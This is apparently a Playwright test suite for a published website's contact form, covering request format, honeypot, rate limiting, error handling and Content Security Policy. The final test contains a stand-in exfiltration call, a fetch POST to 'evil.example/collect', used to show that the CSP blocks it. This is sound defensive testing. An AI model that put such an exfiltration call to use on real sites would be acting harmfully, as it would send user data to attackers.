import { expect, test, type Page, type Route } from "@playwright/test";
import { exampleProject, type Project } from "@avc/schema";
import { buildSite } from "@avc/publisher";

// A REAL build with forms connected, served to a real browser under its real CSP, posting to a mocked backend.

const SITE = "https://published.test";
const BACKEND = "https://abc.supabase.co";
const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
const ANON = `${b64({ alg: "HS256" })}.${b64({ role: "anon", ref: "abc" })}.signaturesignature`;

function withForm(): Project {
  const p = structuredClone(exampleProject);
  p.pages[0]!.nodes.splice(2, 0, { id: "sec_form", kind: "container", type: "section", props: {}, children: [{ id: "contact1", kind: "block", type: "contactForm", variant: "simple", props: { title: "Get in touch", submitLabel: "Send" } }] });
  return p;
}

async function open(page: Page) {
  const r = await buildSite(withForm(), [], { baseUrl: SITE, forms: { supabaseUrl: BACKEND, anonKey: ANON, siteSlug: "my-school" } });
  if (!r.ok) throw new Error(r.errors.join());
  const headers: Record<string, string> = {};
  for (const line of Buffer.from(r.files["_headers"]!).toString().split(/\n\n/)[0]!.split("\n").slice(1)) {
    const i = line.indexOf(":");
    if (i > 0) headers[line.slice(0, i).trim()] = line.slice(i + 1).trim();
  }
  const violations: string[] = [];
  await page.exposeFunction("__v", (v: string) => violations.push(v));
  await page.addInitScript(() => document.addEventListener("securitypolicyviolation", (e) => (window as any).__v(`${e.violatedDirective}|${e.blockedURI}`)));
  await page.route(`${SITE}/**`, (route) => route.fulfill({ status: 200, headers, contentType: "text/html; charset=utf-8", body: Buffer.from(r.files["index.html"]!) }));
  await page.goto(SITE + "/");
  return { violations };
}

type Seen = { url: string; headers: Record<string, string>; body: any };
async function backend(page: Page, reply: (n: number, route: Route) => Promise<void> | void) {
  const seen: Seen[] = [];
  await page.route(`${BACKEND}/**`, async (route) => {
    const req = route.request();
    seen.push({ url: req.url(), headers: req.headers(), body: req.postDataJSON() });
    await reply(seen.length, route);
  });
  return seen;
}
const ok = (route: Route) => route.fulfill({ status: 200, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify({ ok: true }) });
const fill = async (page: Page, over: { name?: string; email?: string; message?: string; website?: string } = {}) => {
  const f = page.locator("form[data-avc-form]");
  await f.locator("[name=name]").fill(over.name ?? "Asha");
  await f.locator("[name=email]").fill(over.email ?? "asha@example.com");
  await f.locator("[name=message]").fill(over.message ?? "Is there a batch for class 10?");
  if (over.website) await f.locator("[name=website]").fill(over.website);
};
const status = (page: Page) => page.locator("[data-avc-status]");
const send = (page: Page) => page.locator("form[data-avc-form] button[type=submit]");

// the backend is cross-origin from the site, so the browser sends a preflight first
test.beforeEach(async ({ page }) => {
  await page.route(`${BACKEND}/**`, async (route, req) => { if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "POST" } }); return route.fallback(); });
});

test("a visitor submits the form: correct request, thank-you message, form cleared, no CSP violations", async ({ page }) => {
  const seen = await backend(page, (_n, route) => ok(route));
  const { violations } = await open(page);
  await fill(page);
  await send(page).click();
  await expect(status(page)).toHaveText("Thanks! Your message has been sent.");
  expect(seen).toHaveLength(1);
  expect(seen[0]!.url).toBe(`${BACKEND}/rest/v1/rpc/submit_form`);
  expect(seen[0]!.headers["apikey"]).toBe(ANON);
  expect(seen[0]!.headers["authorization"]).toBe(`Bearer ${ANON}`);
  expect(seen[0]!.body).toEqual({ p_site_slug: "my-school", p_form_id: "contact1", p_fields: { name: "Asha", email: "asha@example.com", message: "Is there a batch for class 10?" }, p_honeypot: "" });
  await expect(page.locator("[name=message]")).toHaveValue("");
  await expect(send(page)).toBeEnabled();
  expect(violations).toEqual([]);
});

test("the honeypot is invisible to people, and whatever a bot puts in it is passed on for the server to drop", async ({ page }) => {
  const seen = await backend(page, (_n, route) => ok(route));
  await open(page);
  const hp = page.locator("[name=website]");
  expect(await hp.evaluate((e) => (e as HTMLElement).getBoundingClientRect().right)).toBeLessThan(0);
  await expect(hp).toHaveAttribute("aria-hidden", "true");
  await fill(page, { website: "http://spam.example" });
  await send(page).click();
  await expect(status(page)).not.toHaveText("");
  expect(seen[0]!.body.p_honeypot).toBe("http://spam.example");
});

test("required fields stop an empty submission before anything is sent", async ({ page }) => {
  const seen = await backend(page, (_n, route) => ok(route));
  await open(page);
  await send(page).click();
  await page.waitForTimeout(300);
  expect(seen).toHaveLength(0);
});

test("a rate-limited visitor gets a clear message and can try again", async ({ page }) => {
  const seen = await backend(page, (n, route) => n === 1
    ? route.fulfill({ status: 400, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify({ code: "R0429", message: "rate_limited" }) })
    : ok(route));
  await open(page);
  await fill(page);
  await send(page).click();
  await expect(status(page)).toContainText("Too many messages");
  await expect(status(page)).toHaveAttribute("data-state", "error");
  await expect(send(page)).toBeEnabled();
  await send(page).click();
  await expect(status(page)).toHaveText("Thanks! Your message has been sent.");
  expect(seen).toHaveLength(2);
});

test("server errors and network failures are reported kindly, never as raw errors", async ({ page }) => {
  let n = 0;
  await backend(page, async (_n, route) => {
    n++;
    if (n === 1) return route.fulfill({ status: 500, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify({ message: "relation form_submissions does not exist", hint: "secret detail" }) });
    return route.abort();
  });
  await open(page);
  await fill(page);
  await send(page).click();
  await expect(status(page)).toHaveText("Sorry, that didn't send. Please try again.");
  await expect(page.locator("body")).not.toContainText("form_submissions");
  await send(page).click();
  await expect(status(page)).toContainText("Couldn't reach the server");
});

test("double clicks send once while a request is in flight", async ({ page }) => {
  const seen = await backend(page, async (_n, route) => { await new Promise((r) => setTimeout(r, 600)); await ok(route); });
  await open(page);
  await fill(page);
  await send(page).dblclick();
  await expect(status(page)).toHaveText("Thanks! Your message has been sent.");
  expect(seen).toHaveLength(1);
});

test("the CSP lets the form talk to the backend and nothing else", async ({ page }) => {
  await backend(page, (_n, route) => ok(route));
  const { violations } = await open(page);
  const blocked = await page.evaluate(() => fetch("https://evil.example/collect", { method: "POST", body: "x" }).then(() => "sent", () => "blocked"));
  expect(blocked).toBe("blocked");
  await expect.poll(() => violations.some((v) => v.startsWith("connect-src|https://evil.example"))).toBe(true); // proves it was the CSP that stopped it
});
